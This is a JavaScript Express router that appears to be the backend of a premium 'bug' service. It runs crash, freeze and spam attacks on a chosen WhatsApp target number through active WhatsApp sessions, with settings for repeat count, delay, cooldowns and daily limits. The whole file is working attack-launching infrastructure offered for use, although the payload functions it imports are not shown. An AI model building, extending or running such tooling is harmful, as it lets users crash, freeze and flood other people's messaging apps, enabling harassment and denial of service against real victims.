const express = require("express");
const { requirePremium } = require("../middleware/auth");
const {
  getBugs,
  getBugById,
  createBug,
  updateBug,
  deleteBug,
  addActivity,
  getSetting
} = require("../utils/dataManager");
const {
  getActiveSessions,
  sendBugBrown,
  sendBugXinvis,
  sendBugXui,
  sendBugSixcrash,
  executeBugWithSession,
  validateTarget,
  getSessionStatus
} = require("../utils/whatsappManager");

const router = express.Router();

// Cooldown management
const cooldowns = new Map();

async function checkCooldown(userId) {
  const cooldownTime = await getSetting("cooldownTime") || 300000; // 5 minutes default
  
  if (cooldowns.has(userId)) {
    const lastUsed = cooldowns.get(userId);
    const timeLeft = cooldownTime - (Date.now() - lastUsed);
    return timeLeft > 0 ? timeLeft : 0;
  }
  return 0;
}

// Get all bugs for current user
router.get("/", async (req, res) => {
  try {
    const bugs = await getBugs(req.user.id);
    res.json({
      success: true,
      bugs
    });
  } catch (error) {
    console.error("Get bugs error:", error);
    res.status(500).json({ error: "Failed to get bugs" });
  }
});

// Get specific bug
router.get("/:id", async (req, res) => {
  try {
    const bug = await getBugById(req.params.id);
    
    if (!bug) {
      return res.status(404).json({ error: "Bug not found" });
    }
    
    // Check if user owns this bug or is admin
    if (bug.createdBy._id.toString() !== req.user.id && req.user.role !== "admin" && req.user.role !== "owner") {
      return res.status(403).json({ error: "Access denied" });
    }
    
    res.json({
      success: true,
      bug
    });
  } catch (error) {
    console.error("Get bug error:", error);
    res.status(500).json({ error: "Failed to get bug" });
  }
});

// Create new bug
router.post("/", requirePremium, async (req, res) => {
  try {
    const { name, description, type, target, message, count, delay } = req.body;
    
    if (!name || !type || !target) {
      return res.status(400).json({ error: "Name, type, and target are required" });
    }
    
    // Check cooldown
    const cooldownLeft = await checkCooldown(req.user.id);
    if (cooldownLeft > 0) {
      return res.status(429).json({ 
        error: "Cooldown active", 
        cooldownLeft 
      });
    }
    
    // Check daily limit
    const maxBugPerDay = await getSetting("maxBugPerDay") || 50;
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    
    const todayBugs = await getBugs(req.user.id);
    const todayBugCount = todayBugs.filter(bug => 
      new Date(bug.createdAt) >= today
    ).length;
    
    if (todayBugCount >= maxBugPerDay) {
      return res.status(429).json({ 
        error: `Daily limit reached (${maxBugPerDay} bugs per day)` 
      });
    }
    
    const bugData = {
      name,
      description: description || "",
      type,
      target,
      message: message || "",
      count: parseInt(count) || 1,
      delay: parseInt(delay) || 1,
      status: "stopped",
      progress: 0,
      createdBy: req.user.id
    };
    
    const bug = await createBug(bugData);
    
    // Set cooldown
    cooldowns.set(req.user.id, Date.now());
    
    // Log activity
    await addActivity({
      userId: req.user.id,
      action: "create_bug",
      description: `Created bug: ${name}`,
      metadata: { bugId: bug._id, type, target }
    });
    
    res.status(201).json({
      success: true,
      message: "Bug created successfully",
      bug
    });
    
  } catch (error) {
    console.error("Create bug error:", error);
    res.status(500).json({ error: "Failed to create bug" });
  }
});

// Update bug
router.put("/:id", async (req, res) => {
  try {
    const bug = await getBugById(req.params.id);
    
    if (!bug) {
      return res.status(404).json({ error: "Bug not found" });
    }
    
    // Check if user owns this bug or is admin
    if (bug.createdBy._id.toString() !== req.user.id && req.user.role !== "admin" && req.user.role !== "owner") {
      return res.status(403).json({ error: "Access denied" });
    }
    
    const updateData = {};
    const allowedFields = ["name", "description", "message", "count", "delay", "status"];
    
    allowedFields.forEach(field => {
      if (req.body[field] !== undefined) {
        updateData[field] = req.body[field];
      }
    });
    
    const updatedBug = await updateBug(req.params.id, updateData);
    
    // Log activity
    await addActivity({
      userId: req.user.id,
      action: "update_bug",
      description: `Updated bug: ${updatedBug.name}`,
      metadata: { bugId: updatedBug._id, changes: Object.keys(updateData) }
    });
    
    res.json({
      success: true,
      message: "Bug updated successfully",
      bug: updatedBug
    });
    
  } catch (error) {
    console.error("Update bug error:", error);
    res.status(500).json({ error: "Failed to update bug" });
  }
});

// Delete bug
router.delete("/:id", async (req, res) => {
  try {
    const bug = await getBugById(req.params.id);
    
    if (!bug) {
      return res.status(404).json({ error: "Bug not found" });
    }
    
    // Check if user owns this bug or is admin
    if (bug.createdBy._id.toString() !== req.user.id && req.user.role !== "admin" && req.user.role !== "owner") {
      return res.status(403).json({ error: "Access denied" });
    }
    
    await deleteBug(req.params.id);
    
    // Log activity
    await addActivity({
      userId: req.user.id,
      action: "delete_bug",
      description: `Deleted bug: ${bug.name}`,
      metadata: { bugId: bug._id, type: bug.type }
    });
    
    res.json({
      success: true,
      message: "Bug deleted successfully"
    });
    
  } catch (error) {
    console.error("Delete bug error:", error);
    res.status(500).json({ error: "Failed to delete bug" });
  }
});

// Execute bug
router.post("/:id/execute", requirePremium, async (req, res) => {
  try {
    const bug = await getBugById(req.params.id);
    
    if (!bug) {
      return res.status(404).json({ error: "Bug not found" });
    }
    
    // Check if user owns this bug
    if (bug.createdBy._id.toString() !== req.user.id) {
      return res.status(403).json({ error: "Access denied" });
    }
    
    // Check cooldown
    const cooldownLeft = await checkCooldown(req.user.id);
    if (cooldownLeft > 0) {
      return res.status(429).json({ 
        error: "Cooldown active", 
        cooldownLeft 
      });
    }
    
    // Check if there are active sessions
    const activeSessions = getActiveSessions();
    if (activeSessions.length === 0) {
      return res.status(400).json({ error: "No active WhatsApp sessions" });
    }
    
    // Update bug status to active
    await updateBug(bug._id, { status: "active", progress: 0 });
    
    // Set cooldown
    cooldowns.set(req.user.id, Date.now());
    
    // Validate and format target
    const validatedTarget = validateTarget(bug.target);
    
    // Execute bug based on type with improved handling
    let result;
    try {
      const bugTypeMap = {
        "crash": "sixcrash",
        "freeze": "brown", 
        "spam": "xinvis",
        "custom": "xui"
      };
      
      const bugType = bugTypeMap[bug.type];
      if (!bugType) {
        throw new Error(`Invalid bug type: ${bug.type}`);
      }
      
      // Prepare parameters based on bug type
      let params;
      if (bug.type === "spam" || bug.type === "custom") {
        params = [bug.message || "VortexBizguard Message", bug.count, bug.delay];
      } else {
        params = [bug.count, bug.delay];
      }
      
      // Execute with enhanced error handling and retry mechanism
      result = await executeBugWithSession(bugType, validatedTarget, params);
      
      // Update bug status to completed
      await updateBug(bug._id, { status: "completed", progress: 100 });
      
      // Log activity
      await addActivity({
        userId: req.user.id,
        action: "execute_bug",
        description: `Executed bug: ${bug.name}`,
        metadata: { 
          bugId: bug._id, 
          type: bug.type, 
          target: bug.target,
          count: bug.count,
          result: result ? "success" : "failed"
        }
      });
      
      res.json({
        success: true,
        message: "Bug executed successfully",
        result
      });
      
    } catch (executeError) {
      // Update bug status to failed
      await updateBug(bug._id, { status: "failed" });
      
      console.error("Bug execution error:", executeError);
      res.status(500).json({ error: "Bug execution failed" });
    }
    
  } catch (error) {
    console.error("Execute bug error:", error);
    res.status(500).json({ error: "Failed to execute bug" });
  }
});

// Stop bug execution
router.post("/:id/stop", async (req, res) => {
  try {
    const bug = await getBugById(req.params.id);
    
    if (!bug) {
      return res.status(404).json({ error: "Bug not found" });
    }
    
    // Check if user owns this bug
    if (bug.createdBy._id.toString() !== req.user.id) {
      return res.status(403).json({ error: "Access denied" });
    }
    
    // Update bug status to stopped
    await updateBug(bug._id, { status: "stopped" });
    
    // Log activity
    await addActivity({
      userId: req.user.id,
      action: "stop_bug",
      description: `Stopped bug: ${bug.name}`,
      metadata: { bugId: bug._id }
    });
    
    res.json({
      success: true,
      message: "Bug stopped successfully"
    });
    
  } catch (error) {
    console.error("Stop bug error:", error);
    res.status(500).json({ error: "Failed to stop bug" });
  }
});

// Get cooldown status
router.get("/cooldown/status", async (req, res) => {
  try {
    const cooldownTime = await getSetting("cooldownTime") || 300000;
    const cooldownLeft = await checkCooldown(req.user.id);
    
    res.json({
      success: true,
      cooldownTime,
      cooldownLeft
    });
  } catch (error) {
    console.error("Cooldown status error:", error);
    res.status(500).json({ error: "Failed to get cooldown status" });
  }
});

// Test target validation
router.post("/validate-target", async (req, res) => {
  try {
    const { target } = req.body;
    
    if (!target) {
      return res.status(400).json({ error: "Target is required" });
    }
    
    const validatedTarget = validateTarget(target);
    
    res.json({
      success: true,
      original: target,
      validated: validatedTarget,
      isValid: true
    });
  } catch (error) {
    console.error("Target validation error:", error);
    res.status(400).json({ 
      success: false,
      error: "Invalid target format",
      original: req.body.target || "",
      isValid: false
    });
  }
});

// Get WhatsApp sessions status
router.get("/sessions/status", async (req, res) => {
  try {
    const activeSessions = getActiveSessions();
    const sessionStatuses = activeSessions.map(phoneNumber => 
      getSessionStatus(phoneNumber)
    );
    
    res.json({
      success: true,
      totalSessions: activeSessions.length,
      sessions: sessionStatuses,
      canExecute: activeSessions.length > 0
    });
  } catch (error) {
    console.error("Sessions status error:", error);
    res.status(500).json({ error: "Failed to get sessions status" });
  }
});

module.exports = router;

